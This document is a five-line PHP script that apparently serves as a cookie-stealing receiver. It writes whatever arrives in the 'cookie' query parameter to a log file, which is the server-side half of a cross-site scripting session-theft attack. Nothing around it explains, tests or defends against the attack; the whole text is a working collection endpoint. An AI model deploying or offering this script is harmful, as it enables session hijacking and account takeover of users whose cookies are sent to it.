<?php
$file = fopen("logs.txt", "a+");
fwrite($file, $_GET['cookie'] . "\n");
fclose($file);
?>
